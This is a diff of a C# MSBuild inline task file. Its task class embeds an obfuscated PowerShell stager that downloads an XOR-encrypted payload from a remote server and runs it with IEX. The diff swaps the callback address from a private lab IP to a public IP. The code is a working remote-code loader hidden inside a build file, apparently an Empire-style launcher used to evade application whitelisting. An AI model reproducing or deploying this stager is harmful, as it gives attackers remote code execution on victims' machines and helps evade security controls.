@@ -25,7 +25,7 @@
 			using Microsoft.Build.Utilities;							
 			public class QWEridxnaPO :  Task, ITask {
 				public override bool Execute() {
-					string pok = "$WC=NeW-OBJecT SyStem.NET.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAders.ADd('User-Agent',$u);$Wc.ProxY = [SYsTem.NET.WEBREQUesT]::DEFAuLtWebPRoxy;$WC.PROxY.CrEdentIalS = [SYSteM.Net.CreDentialCACHe]::DEFAulTNETWOrkCrEdEnTialS;$K='daf00538a3dfee3f25671a3f9d076377';$i=0;[Char[]]$B=([char[]]($Wc.DownLoADSTriNG('http://10.0.2.15:8080/index.asp')))|%{$_-bXoR$K[$I++%$K.LENGTH]};IEX ($b-joiN'')";
+					string pok = "$WC=NeW-OBJecT SyStem.NET.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAders.ADd('User-Agent',$u);$Wc.ProxY = [SYsTem.NET.WEBREQUesT]::DEFAuLtWebPRoxy;$WC.PROxY.CrEdentIalS = [SYSteM.Net.CreDentialCACHe]::DEFAulTNETWOrkCrEdEnTialS;$K='daf00538a3dfee3f25671a3f9d076377';$i=0;[Char[]]$B=([char[]]($Wc.DownLoADSTriNG('http://104.239.168.216:8080/index.asp')))|%{$_-bXoR$K[$I++%$K.LENGTH]};IEX ($b-joiN'')";
 					Runspace runspace = RunspaceFactory.CreateRunspace();
 					runspace.Open();
 					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
